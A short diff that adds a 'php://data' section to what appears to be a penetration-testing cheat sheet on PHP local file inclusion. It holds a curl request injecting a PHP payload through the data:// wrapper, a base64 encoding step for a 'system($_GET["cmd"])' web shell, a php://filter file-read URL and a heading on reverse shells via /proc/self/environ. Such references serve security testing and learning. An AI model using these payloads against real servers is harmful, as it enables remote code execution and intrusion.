@@ -173,6 +173,14 @@ Decode
 
     http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
 
+### 3) php://data
+
+    curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"
+
+Encode PHP payload in base64
+
+    echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
+
 ## Reverse Shell via LFI
 
 Inject a shell using /proc/self/environ. If the environment variables are writable, inject PHP code into the environment.
